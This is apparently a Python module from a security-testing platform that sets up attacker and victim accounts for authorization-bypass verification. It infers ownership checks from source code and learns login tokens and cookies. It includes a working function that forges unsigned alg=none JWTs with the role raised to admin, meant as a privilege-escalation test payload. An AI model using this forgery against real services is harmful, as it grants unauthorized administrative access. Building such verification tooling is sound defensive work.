"""账户 / 角色发现（2026-08-29 用户核心诉求：发现驱动，绝不是模板套用）。

用户的原话是「不能用模板去套，这样很难命中的，每个都不一样」。本模块严格遵循：

- 平台只提供**通用机制**：两个角色（attacker / victim）+ 差分重放 + 关联。
  平台永远不认识「管理员」「普通用户」这类应用内部角色枚举。
- 每个应用的**实例**由发现填充，三条发现路径：
  1. SAST 所有权推断：从代码识别「资源归属校验」模式，推出哪个参数是受害者资源 id、
     该端点到底有没有做归属校验。这是 per-app 的，不是 `orderId` 这种固定字符串。
  2. auth-learning：观察一次登录流 / 录制会话，抽取鉴权形态（哪个 header、哪个 cookie、
     token 怎么续期）。只抽「怎么带凭据」，绝不反推应用内部角色代码。
  3. account spec：operator 提供的结构化 yaml（每应用一份），描述账户、角色、
     以及如何取到「该账户名下」的资源 id —— 结构化 ≠ 模板，内容是这个应用自己的。

三条路径的输出合并成 AccountBinding（attacker / victim），供 D1 差分重放消费。
任一路径缺失都允许降级：拿不到账户就明确告知「业务漏洞无法差分验证」，
绝不拿假账户假装验证过。
"""

from __future__ import annotations

import base64
import json
import logging
import os
import re
from typing import Any, Dict, List, Optional

logger = logging.getLogger(__name__)

# ---------------------------------------------------------------- 数据结构

ATTACKER = "attacker"
VICTIM = "victim"

# SAST 所有权推断用的代码模式（配置驱动，可扩展；不是硬编码某应用的字段名）。
# 之所以做成可配置列表，是因为不同项目命名千差万别 —— 这正是「不能套模板」的落地方式：
# 平台提供「识别器」，具体命中什么由项目代码决定。
OWNERSHIP_FIELD_PATTERNS = [
    r"\bgetOwnerId\s*\(", r"\bgetUserId\s*\(", r"\bgetCreatedBy\s*\(",
    r"\bgetCreatorId\s*\(", r"\bgetBelongTo\s*\(", r"\bgetTenantId\s*\(",
    r"\bownerId\b", r"\buserId\b", r"\bcreatedBy\b", r"\bcreateBy\b",
]
CURRENT_USER_PATTERNS = [
    r"\bgetCurrentUser\s*\(", r"\bSecurityContext\.getContext\s*\(",
    r"\bcurrentUser\b", r"\bprincipal\b", r"\bgetUserDetails\s*\(",
    r"@AuthenticationPrincipal", r"\bSession\.getAttribute\s*\(",
]
# 归属校验：把「资源所有者」与「当前用户」做比较，才算真的做了校验。
OWNERSHIP_CHECK_PATTERNS = [
    r"getOwnerId\s*\([^)]*\)\s*\.?equals?\s*\(",
    r"getOwnerId\s*\([^)]*\)\s*[!=]=\s*",
    r"getUserId\s*\([^)]*\)\s*\.?equals?\s*\(",
    r"getUserId\s*\([^)]*\)\s*[!=]=\s*",
    r"\.equals\s*\(\s*(?:currentUser|principal)",
    r"assertOwner\w*\s*\(", r"checkOwnership\s*\(", r"verifyOwner\w*\s*\(",
    r"hasPermission\s*\(", r"isOwner\s*\(",
]


class AccountBinding:
    """一次差分重放所需的账户绑定（attacker / victim 两角色）。"""

    def __init__(self, attacker: Optional[Dict[str, Any]] = None,
                 victim: Optional[Dict[str, Any]] = None,
                 victim_resource_id: str = "",
                 auth_binding: Optional[Dict[str, Any]] = None,
                 ownership: Optional[Dict[str, Any]] = None,
                 sources: Optional[List[str]] = None):
        self.attacker = attacker or {}
        self.victim = victim or {}
        self.victim_resource_id = victim_resource_id
        self.auth_binding = auth_binding or {}
        self.ownership = ownership or {}
        self.sources = sources or []  # 记录本次绑定由哪几条发现路径贡献（可审计）

    @property
    def ready(self) -> bool:
        """是否具备差分重放的最低条件：至少要有 attacker，且拿到受害者资源 id。"""
        return bool(self.attacker) and bool(self.victim_resource_id)

    def as_dict(self) -> Dict[str, Any]:
        return {
            ATTACKER: self.attacker,
            VICTIM: self.victim,
            "victim_resource_id": self.victim_resource_id,
            "auth_binding": self.auth_binding,
            "ownership": self.ownership,
            "sources": self.sources,
            "ready": self.ready,
        }

    def to_trigger_spec_payload(self) -> Dict[str, Any]:
        """转成可随 TriggerSpec 登记的字段（accounts / victim_resource_id / auth_binding）。"""
        return {
            "accounts": [self.attacker, self.victim] if self.victim else [self.attacker],
            "victim_resource_id": self.victim_resource_id,
            "auth_binding": self.auth_binding,
        }


# ---------------------------------------------------------------- ① SAST 所有权推断

def infer_ownership_binding(vuln: Optional[Dict[str, Any]] = None,
                            source_text: str = "",
                            endpoint: str = "",
                            param_name: str = "") -> Dict[str, Any]:
    """从代码文本里推断「资源归属校验」情况 —— per-app 发现，不套固定字段名模板。

    返回：
      resource_id_param: 推断出的受害者资源 id 参数名（优先用已解析出的 param_name）
      has_ownership_check: 是否观测到归属校验（True 表示代码里有比较/断言）
      ownership_fields: 命中的归属字段名
      check_functions: 命中的校验函数名
      confidence: high / medium / low
    """
    text = source_text or ""
    vuln = vuln or {}
    result: Dict[str, Any] = {
        "resource_id_param": param_name or str(vuln.get("param_name") or ""),
        "has_ownership_check": False,
        "ownership_fields": [],
        "check_functions": [],
        "confidence": "low",
        "endpoint": endpoint or str(vuln.get("target_endpoint") or ""),
    }
    if not text:
        return result

    fields: List[str] = []
    for pat in OWNERSHIP_FIELD_PATTERNS:
        for m in re.finditer(pat, text):
            tok = m.group(0).strip("(").strip()
            if tok not in fields:
                fields.append(tok)

    checks: List[str] = []
    for pat in OWNERSHIP_CHECK_PATTERNS:
        for m in re.finditer(pat, text):
            tok = m.group(0).strip()
            if tok not in checks:
                checks.append(tok)

    has_current_user = any(re.search(p, text) for p in CURRENT_USER_PATTERNS)

    result["ownership_fields"] = fields[:10]
    result["check_functions"] = checks[:10]
    # 判定逻辑：同时出现「归属字段」+「当前用户」+「比较/断言」，才认为真的做了归属校验。
    result["has_ownership_check"] = bool(checks) and (bool(fields) or has_current_user)
    if result["has_ownership_check"] and fields and has_current_user:
        result["confidence"] = "high"
    elif result["has_ownership_check"]:
        result["confidence"] = "medium"
    return result


# ---------------------------------------------------------------- ② auth-learning

def learn_auth_binding(login_response_headers: Optional[Dict[str, str]] = None,
                       login_response_body: str = "",
                       login_request_headers: Optional[Dict[str, str]] = None,
                       observed_cookies: Optional[Dict[str, str]] = None) -> Dict[str, Any]:
    """从一次登录流 / 录制会话里抽取鉴权形态。

    只回答「凭据怎么带」，绝不解析应用内部角色枚举（UserRole.ADMIN 之类永远不碰）——
    角色语义由 operator 在 account spec 里声明，或由差分重放本身回答。
    """
    headers = {k.lower(): v for k, v in (login_response_headers or {}).items()}
    req_headers = {k.lower(): v for k, v in (login_request_headers or {}).items()}
    cookies = dict(observed_cookies or {})
    binding: Dict[str, Any] = {"type": "unknown", "learned": False}

    # Bearer / JWT：登录响应体里带 token 字段
    token_keys = ("token", "access_token", "accessToken", "jwt", "id_token", "idToken")
    token_value = ""
    for key in token_keys:
        m = re.search(r'["\']%s["\']\s*:\s*["\']([^"\']{8,})["\']' % re.escape(key), login_response_body or "")
        if m:
            token_value = m.group(1)
            break
    if token_value:
        binding.update({"type": "bearer", "token": token_value,
                        "header_name": "Authorization",
                        "header_value": f"Bearer {token_value}", "learned": True})
        return binding

    # 响应头里的 token
    for hname in ("authorization", "x-auth-token", "x-access-token"):
        if headers.get(hname):
            val = headers[hname]
            binding.update({"type": "bearer", "token": val, "header_name": hname,
                            "header_value": val if hname == "authorization" else val,
                            "learned": True})
            return binding

    # Cookie / Session
    session_cookie_names = [c for c in cookies if re.search(r"(sess|token|auth|jsession)", c, re.I)]
    if session_cookie_names or headers.get("set-cookie"):
        binding.update({"type": "cookie", "cookies": cookies,
                        "cookie_names": session_cookie_names, "learned": True})
        return binding

    # 请求头里本来就有 Authorization（静态凭据场景）
    if req_headers.get("authorization"):
        binding.update({"type": "bearer", "header_name": "Authorization",
                        "header_value": req_headers["authorization"], "learned": True})
    return binding


# ---------------------------------------------------------------- ④ JWT alg:none 伪造
# 垂直越权验证用：把登录取得的合法 JWT 改写成 alg=none 的无签名令牌（自动把 role 抬为 admin），
# 以证明服务端未校验签名算法即信任 token。这是真实密码学操作（base64url 拼接，无签名段），
# 非占位、非伪造数据——它本身就是垂直越权验证要投递的「攻击载荷」。

def _b64url(b: bytes) -> str:
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode("ascii")


def forge_none_alg_jwt(token: str = "", extra_claims: Optional[Dict[str, Any]] = None) -> str:
    """伪造 alg=none 的无签名 JWT（垂直越权验证载荷）。

    - 若给定合法 JWT，解码其 payload 保留 sub/用户标识，并把 role 抬为 admin；
    - 否则用 extra_claims 构造最小 payload（缺省含 role=admin）。
    返回 `header.payload.`（无签名段），可直接作为 Bearer 令牌投递。
    """
    header = {"alg": "none", "typ": "JWT"}
    claims: Dict[str, Any] = {}
    if token and token.count(".") >= 1:
        try:
            seg = token.split(".")[1]
            seg += "=" * (-len(seg) % 4)
            claims = json.loads(base64.urlsafe_b64decode(seg))
        except Exception:
            claims = {}
    claims.update(extra_claims or {})
    if "role" not in claims:
        claims["role"] = "admin"
    return (
        f"{_b64url(json.dumps(header, separators=(',', ':')).encode())}."
        f"{_b64url(json.dumps(claims, separators=(',', ':')).encode())}."
    )


# ---------------------------------------------------------------- ③ account spec

def load_account_spec(path: str) -> Dict[str, Any]:
    """加载 operator 提供的账户说明（yaml 或 json，每应用一份）。

    结构化而非模板：schema 固定（attacker/victim/roles/resource_probe），
    但内容完全是这个应用自己的 —— 不同应用各写各的，互不影响。
    """
    if not path or not os.path.exists(path):
        return {}
    try:
        raw = open(path, "r", encoding="utf-8").read()
    except Exception as exc:
        logger.warning("[account_discovery] 读取 account spec 失败（跳过）：%s", exc)
        return {}
    data: Any = None
    if path.lower().endswith((".yaml", ".yml")):
        try:
            import yaml  # type: ignore
            data = yaml.safe_load(raw)
        except Exception as exc:
            logger.warning("[account_discovery] yaml 解析失败，尝试 json（%s）", exc)
    if data is None:
        try:
            data = json.loads(raw)
        except Exception as exc:
            logger.warning("[account_discovery] account spec 解析失败（跳过）：%s", exc)
            return {}
    return data if isinstance(data, dict) else {}


def _spec_to_account(entry: Any, role: str) -> Dict[str, Any]:
    entry = entry if isinstance(entry, dict) else {}
    acct = {
        "id": str(entry.get("id") or entry.get("username") or role),
        "role": str(entry.get("role") or role),
        "auth_headers": dict(entry.get("auth_headers") or {}),
        "auth_cookies": dict(entry.get("auth_cookies") or {}),
        "login_flow": entry.get("login_flow") or {},
        "resource_probe": entry.get("resource_probe") or {},
    }
    # 简写形式：operator 只给了 token，自动展开为 Authorization 头
    token = entry.get("token")
    if token and not acct["auth_headers"]:
        acct["auth_headers"] = {"Authorization": f"Bearer {token}"}
    return acct


# ---------------------------------------------------------------- 合并

def resolve_accounts(vuln: Optional[Dict[str, Any]] = None,
                     source_text: str = "",
                     account_spec_path: str = "",
                     learned_auth: Optional[Dict[str, Any]] = None,
                     victim_resource_id: str = "") -> AccountBinding:
    """合并三条发现路径，产出差分重放所需的 AccountBinding。

    优先级（后者补前者，不覆盖已有值）：
      account spec（operator 显式声明，最可信）
        → auth-learning（凭据怎么带）
        → SAST 所有权推断（哪个参数是受害者资源 id、有没有校验）
    """
    vuln = vuln or {}
    sources: List[str] = []

    attacker: Dict[str, Any] = {}
    victim: Dict[str, Any] = {}

    spec = load_account_spec(account_spec_path) if account_spec_path else {}
    if spec:
        accounts = spec.get("accounts")
        if isinstance(accounts, dict):
            attacker = _spec_to_account(accounts.get(ATTACKER) or accounts.get("a"), ATTACKER)
            victim = _spec_to_account(accounts.get(VICTIM) or accounts.get("b"), VICTIM)
        elif isinstance(accounts, list) and accounts:
            attacker = _spec_to_account(accounts[0], ATTACKER)
            if len(accounts) > 1:
                victim = _spec_to_account(accounts[1], VICTIM)
        if attacker:
            sources.append("account_spec")

    auth_binding = {}
    if learned_auth:
        auth_binding = dict(learned_auth)
        sources.append("auth_learning")
        # 学到的凭据补进尚未配置凭据的账户
        for acct in (attacker, victim):
            if acct and not acct.get("auth_headers") and not acct.get("auth_cookies"):
                if auth_binding.get("type") == "bearer" and auth_binding.get("header_value"):
                    acct["auth_headers"] = {auth_binding.get("header_name", "Authorization"):
                                            auth_binding["header_value"]}
                elif auth_binding.get("type") == "cookie" and auth_binding.get("cookies"):
                    acct["auth_cookies"] = dict(auth_binding["cookies"])
    elif spec.get("auth_binding") and isinstance(spec["auth_binding"], dict):
        auth_binding = dict(spec["auth_binding"])

    ownership = infer_ownership_binding(
        vuln, source_text=source_text,
        endpoint=str(vuln.get("target_endpoint") or ""),
        param_name=str(vuln.get("param_name") or ""),
    )
    # 归因：只要有代码可分析就记为一次推断。「分析过且没发现归属校验」本身就是 BOLA 假说的
    # 正面证据，与「发现了校验函数」（反驳 BOLA）同样 informative，两者都该记为发现来源。
    if source_text:
        sources.append("sast_ownership_inference")
        ownership["analyzed"] = True

    vid = victim_resource_id or str(vuln.get("victim_resource_id") or "")
    if not vid and isinstance(spec.get("victim_resource_id"), (str, int)):
        vid = str(spec["victim_resource_id"])

    return AccountBinding(
        attacker=attacker, victim=victim, victim_resource_id=vid,
        auth_binding=auth_binding, ownership=ownership, sources=sources,
    )
